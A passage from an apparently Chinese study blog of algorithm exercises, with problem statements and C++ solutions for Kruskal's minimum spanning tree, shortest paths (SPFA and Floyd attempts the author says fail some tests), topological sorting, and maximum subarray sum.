class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h3 id="畅通工程">畅通工程</h3><h4 id="题目描述-35">题目描述</h4><p>省政府“畅通工程”的目标是使全省任何两个村庄间都可以实现公路交通（但不一定有直接的公路相连，只要能间接通过公路可达即可）。经过调查评估，得到的统计表中列出了有可能建设公路的若干条道路的成本。现请你编写程序，计算出全省畅通需要的最低成本。</p><h5 id="输入输出格式-33">输入输出格式</h5><h6 id="输入描述-35">输入描述:</h6><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">测试输入包含若干测试用例。每个测试用例的第<span class="number">1</span>行给出评估的道路条数 <span class="built_in">N</span>、村庄数目M (<span class="built_in">N</span>, M &lt; =<span class="number">100</span> )；随后的 <span class="built_in">N</span> 行对应村庄间道路的成本，每行给出一对正整数，分别是两个村庄的编号，以及此两村庄间道路的成本（也是正整数）。为简单起见，村庄从<span class="number">1</span>到M编号。当<span class="built_in">N</span>为<span class="number">0</span>时，全部输入结束，相应的结果不要输出。</span><br></pre></td></tr></table></figure><h6 id="输出描述-35">输出描述:</h6><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">对每个测试用例，在<span class="number">1</span>行里输出全省畅通需要的最低成本。若统计数据不足以保证畅通，则输出“<span class="string">?”</span>。</span><br></pre></td></tr></table></figure><p>克鲁斯卡尔算法+合并集(注释是因为不知道为什么加入rank会报错)</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn = <span class="number">100</span>+<span class="number">5</span>;</span><br><span class="line"><span class="type">int</span> f[maxn];</span><br><span class="line"><span class="comment">//int rank[maxn];</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span>&#123;</span><br><span class="line"><span class="type">int</span> u, v, w;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">cmp</span><span class="params">(<span class="keyword">struct</span> node a, <span class="keyword">struct</span> node b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a.w &lt; b.w;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">initial</span><span class="params">(<span class="type">int</span> n)</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">f[i] = i;</span><br><span class="line"><span class="comment">//rank[i] = 1;</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(x == f[x]) <span class="keyword">return</span> x;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">f[x] = <span class="built_in">find</span>(f[x]);</span><br><span class="line"><span class="keyword">return</span> f[x];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//void merge(int x, int y)&#123;</span></span><br><span class="line"><span class="comment">//int fx = find(x), fy = find(y);</span></span><br><span class="line"><span class="comment">//if(rank[x] &lt;= rank[y])&#123;</span></span><br><span class="line"><span class="comment">//f[fx] = fy;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//else&#123;</span></span><br><span class="line"><span class="comment">//f[fy] = fx;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//if(rank[fx] == rank[fy] &amp;&amp; fx != fy)&#123;</span></span><br><span class="line"><span class="comment">//rank[fy]++;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; n &gt;&gt; m)&#123;</span><br><span class="line"><span class="keyword">if</span>(n == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line"><span class="built_in">initial</span>(m);</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span> edge[n];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">cin &gt;&gt; edge[i].u &gt;&gt; edge[i].v &gt;&gt; edge[i].w;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">sort</span>(edge, edge+n, cmp);</span><br><span class="line"><span class="type">int</span> ans = <span class="number">0</span>, r = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line"><span class="type">int</span> fx = <span class="built_in">find</span>(edge[i].u), fy = <span class="built_in">find</span>(edge[i].v);</span><br><span class="line"><span class="keyword">if</span>(fx != fy)&#123;</span><br><span class="line">ans++;</span><br><span class="line">r += edge[i].w;</span><br><span class="line">f[fx] = fy;</span><br><span class="line"><span class="comment">//merge(fx, fy);</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(m - <span class="number">1</span> &gt; ans)&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;?&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">cout &lt;&lt; r &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h3 id="最短路">最短路</h3><h5 id="题目描述-36">题目描述</h5><p>在每年的校赛里，所有进入决赛的同学都会获得一件很漂亮的t-shirt。但是每当我们的工作人员把上百件的衣服从商店运回到赛场的时候，却是非常累的！所以现在他们想要寻找最短的从商店到赛场的路线，你可以帮助他们吗？</p><h5 id="输入输出格式-34">输入输出格式</h5><h6 id="输入描述-36">输入描述:</h6><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入包括多组数据。每组数据第一行是两个整数<span class="built_in">N</span>、<span class="variable">M</span>（<span class="built_in">N</span><span class="operator">&lt;=</span><span class="number">100</span>，<span class="variable">M</span><span class="operator">&lt;=</span><span class="number">10000</span>），<span class="built_in">N</span>表示成都的大街上有几个路口，标号为<span class="number">1</span>的路口是商店所在地，标号为<span class="built_in">N</span>的路口是赛场所在地，<span class="variable">M</span>则表示在成都有几条路。<span class="built_in">N</span><span class="operator">=</span><span class="variable">M</span><span class="operator">=</span><span class="number">0</span>表示输入结束。接下来<span class="variable">M</span>行，每行包括<span class="number">3</span>个整数<span class="variable">A</span>，<span class="variable">B</span>，<span class="built_in">C</span>（<span class="number">1</span><span class="operator">&lt;=</span><span class="variable">A</span><span class="operator">,</span><span class="variable">B</span><span class="operator">&lt;=</span><span class="built_in">N</span><span class="operator">,</span><span class="number">1</span><span class="operator">&lt;=</span><span class="built_in">C</span><span class="operator">&lt;=</span><span class="number">1000</span>）<span class="operator">,</span>表示在路口<span class="variable">A</span>与路口<span class="variable">B</span>之间有一条路，我们的工作人员需要<span class="built_in">C</span>分钟的时间走过这条路。</span><br><span class="line">输入保证至少存在<span class="number">1</span>条商店到赛场的路线。</span><br></pre></td></tr></table></figure><h6 id="输出描述-36">输出描述:</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">对于每组输入，输出一行，表示工作人员从商店走到赛场的最短时间</span><br></pre></td></tr></table></figure><p>我写的spfa不能通过全部的</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAX = <span class="number">0x7ffffff</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn = <span class="number">105</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">edge</span>&#123;</span><br><span class="line"><span class="type">int</span> u, v, w;</span><br><span class="line"><span class="built_in">edge</span>(<span class="type">int</span> u_, <span class="type">int</span> v_, <span class="type">int</span> w_)&#123;</span><br><span class="line">u = u_;</span><br><span class="line">v = v_;</span><br><span class="line">w = w_;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line">vector&lt;edge&gt; edges; </span><br><span class="line">vector&lt;<span class="type">int</span>&gt; gra[maxn];</span><br><span class="line"><span class="type">int</span> vis[maxn];</span><br><span class="line"><span class="type">int</span> dis[maxn];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">edges.<span class="built_in">clear</span>();</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; maxn; i++)&#123;</span><br><span class="line">dis[i] = maxn;</span><br><span class="line">vis[i] = <span class="number">0</span>;</span><br><span class="line">gra[i].<span class="built_in">clear</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">spfa</span><span class="params">(<span class="type">int</span> s)</span></span>&#123;</span><br><span class="line">dis[s] = <span class="number">0</span>;</span><br><span class="line">priority_queue&lt;<span class="type">int</span>&gt; q;</span><br><span class="line">q.<span class="built_in">push</span>(s);</span><br><span class="line"><span class="comment">//vis[s] = 1;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(!q.<span class="built_in">empty</span>())&#123;</span><br><span class="line"><span class="type">int</span> now = q.<span class="built_in">top</span>();</span><br><span class="line">q.<span class="built_in">pop</span>();</span><br><span class="line">vis[now] = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//cout &lt;&lt; now &lt;&lt; endl;</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; gra[now].<span class="built_in">size</span>(); i++)&#123;</span><br><span class="line">edge e = edges[gra[now][i]];</span><br><span class="line"><span class="comment">//cout &lt;&lt; e.u &lt;&lt; e.v &lt;&lt; e.w &lt;&lt; dis[e.v]&lt;&lt; endl;</span></span><br><span class="line"><span class="keyword">if</span>(dis[e.v] &gt; dis[now] + e.w)&#123;</span><br><span class="line">dis[e.v] = dis[now] + e.w;</span><br><span class="line"><span class="keyword">if</span>(!vis[e.v])&#123;</span><br><span class="line">vis[e.v] = <span class="number">1</span>;</span><br><span class="line">q.<span class="built_in">push</span>(e.v);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">addedge</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b, <span class="type">int</span> c)</span></span>&#123;</span><br><span class="line">edges.<span class="built_in">push_back</span>(<span class="built_in">edge</span>(a, b, c));</span><br><span class="line"><span class="type">int</span> sz = edges.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line">gra[a].<span class="built_in">push_back</span>(sz);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; n &gt;&gt; m)&#123;</span><br><span class="line"><span class="keyword">if</span>(m == <span class="number">0</span> &amp;&amp; n == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line"><span class="built_in">init</span>();</span><br><span class="line"><span class="comment">//cout &lt;&lt; dis[2] &lt;&lt; endl;</span></span><br><span class="line"><span class="comment">//cout &lt;&lt; &quot;初始化完毕&quot; &lt;&lt; endl;</span></span><br><span class="line"><span class="type">int</span> a, b, c;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++)&#123;</span><br><span class="line">cin &gt;&gt; a &gt;&gt; b &gt;&gt; c;</span><br><span class="line"><span class="built_in">addedge</span>(a, b, c);</span><br><span class="line"><span class="built_in">addedge</span>(b, a, c); </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//cout &lt;&lt; &quot;读取数据完毕&quot; &lt;&lt; endl;</span></span><br><span class="line"><span class="built_in">spfa</span>(<span class="number">1</span>);</span><br><span class="line">cout &lt;&lt; dis[n] &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>floyd全源最短路径也过不了</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAX = <span class="number">0x3f3f</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn = <span class="number">105</span>;</span><br><span class="line"><span class="type">int</span> gra[maxn][maxn];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; n &gt;&gt; m)&#123;</span><br><span class="line"><span class="keyword">if</span>(m == <span class="number">0</span> &amp;&amp; n == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt;= n; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt;= n; j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(i == j) gra[i][j] = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">else</span> gra[i][j] = MAX;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> a, b, c;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++)&#123;</span><br><span class="line">cin &gt;&gt; a &gt;&gt; b &gt;&gt; c;</span><br><span class="line"><span class="keyword">if</span>(c &lt; gra[a][b])&#123;</span><br><span class="line">gra[a][b] = c;</span><br><span class="line">gra[b][a] = c;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> k = <span class="number">1</span>; k &lt;= n; k++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; j &lt;= n; j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(gra[k][i] == MAX &amp;&amp; gra[i][j] == MAX) <span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">if</span>(gra[k][j] == MAX || gra[k][j] &gt; gra[k][i] + gra[i][j])&#123;</span><br><span class="line">gra[k][j] = gra[k][i] + gra[i][j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; gra[<span class="number">1</span>][n] &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h3 id="确定比赛名次">确定比赛名次</h3><h5 id="题目描述-37">题目描述</h5><p>有N个比赛队（1&lt;=N&lt;=500），编号依次为1，2，3，。。。。，N进行比赛，比赛结束后，裁判委员会要将所有参赛队伍从前往后依次排名，但现在裁判委员会不能直接获得每个队的比赛成绩，只知道每场比赛的结果，即P1赢P2，用P1，P2表示，排名时P1在P2之前。现在请你编程序确定排名。</p><h5 id="输入输出格式-35">输入输出格式</h5><h6 id="输入描述-37">输入描述:</h6><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输入有若干组，每组中的第一行为二个数N（<span class="number">1</span>&lt;<span class="symbol">=N</span>&lt;<span class="number">=500</span>），M；其中N表示队伍的个数，M表示接着有M行的输入数据。接下来的M行数据中，每行也有两个整数<span class="built_in">P1</span>，<span class="built_in">P2</span>表示即<span class="built_in">P1</span>队赢了<span class="built_in">P2</span>队。</span><br></pre></td></tr></table></figure><h6 id="输出描述-37">输出描述:</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">给出一个符合要求的排名。输出时队伍号之间有空格，最后一名后面没有空格。</span><br><span class="line"></span><br><span class="line">其他说明：符合条件的排名可能不是唯一的，此时要求输出时编号小的队伍在前；输入数据保证是正确的，即输入数据确保一定能有一个符合要求的排名。</span><br></pre></td></tr></table></figure><p>拓扑排序</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn = <span class="number">505</span>;</span><br><span class="line"><span class="type">int</span> d[maxn];</span><br><span class="line"><span class="type">int</span> mpt[maxn][maxn];</span><br><span class="line"></span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">toposort</span><span class="params">(<span class="type">int</span> n)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">vector&lt;<span class="type">int</span>&gt; ans;</span><br><span class="line">priority_queue&lt;<span class="type">int</span>, vector&lt;<span class="type">int</span>&gt;, greater&lt;<span class="type">int</span>&gt; &gt; q;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line"><span class="keyword">if</span>(d[i] == <span class="number">0</span>) q.<span class="built_in">push</span>(i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>(!q.<span class="built_in">empty</span>())&#123;</span><br><span class="line"><span class="type">int</span> now = q.<span class="built_in">top</span>();</span><br><span class="line">ans.<span class="built_in">push_back</span>(now);</span><br><span class="line">q.<span class="built_in">pop</span>();</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(mpt[now][i] == <span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(--d[i] == <span class="number">0</span>)&#123;</span><br><span class="line">q.<span class="built_in">push</span>(i);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; n &gt;&gt; m)&#123;</span><br><span class="line"><span class="type">int</span> a, b;</span><br><span class="line"><span class="built_in">memset</span>(d, <span class="number">0</span>, <span class="built_in">sizeof</span>(d));</span><br><span class="line"><span class="built_in">memset</span>(mpt, <span class="number">0</span>, <span class="built_in">sizeof</span>(mpt));</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++)&#123;</span><br><span class="line">cin &gt;&gt; a &gt;&gt; b;</span><br><span class="line"><span class="keyword">if</span>(mpt[a][b] == <span class="number">0</span>)&#123;</span><br><span class="line">mpt[a][b] = <span class="number">1</span>;</span><br><span class="line">d[b]++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">vector&lt;<span class="type">int</span>&gt; ans = <span class="built_in">toposort</span>(n);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; ans.<span class="built_in">size</span>(); i++)&#123;</span><br><span class="line">cout &lt;&lt; ans[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h1 id="动态规划">动态规划</h1><p>分而治之</p><p>最后一章了！</p><h2 id="递推">递推</h2><p>比较重要的就是斐波那契数列了，f[n] = f[n-1] + f[n-2]</p><h2 id="最大字段和">最大字段和</h2><h3 id="最大序列和">最大序列和</h3><h5 id="题目描述-38">题目描述</h5><p>给出一个整数序列S，其中有N个数，定义其中一个非空连续子序列T中所有数的和为T的“序列和”。对于S的所有非空连续子序列T，求最大的序列和。变量条件：N为正整数，N≤1000000，结果序列和在范围（-2<sup>63,2</sup>63-1）以内。</p><h5 id="输入输出格式-36">输入输出格式</h5><h6 id="输入描述-38">输入描述:</h6><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">第一行为一个正整数<span class="built_in">N</span>，第二行为<span class="built_in">N</span>个整数，表示序列中的数。</span><br></pre></td></tr></table></figure><h6 id="输出描述-38">输出描述:</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入可能包括多组数据，对于每一组输入数据，</span><br><span class="line">仅输出一个数，表示最大序列和。</span><br></pre></td></tr></table></figure><p>范围比较大，要初始化longlong</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> a[<span class="number">1000005</span>], d[<span class="number">1000005</span>];</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> maxx;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; n)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">cin &gt;&gt; a[i];</span><br><span class="line">&#125;</span><br><span class="line">d[<span class="number">0</span>] = a[<span class="number">0</span>];</span><br><span class="line">maxx = a[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; n; i++)&#123;</span><br><span class="line">d[i] = <span class="built_in">max</span>(d[i<span class="number">-1</span>]+a[i], a[i]);</span><br><span class="line">maxx = <span class="built_in">max</span>(maxx, d[i]);</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; maxx &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span 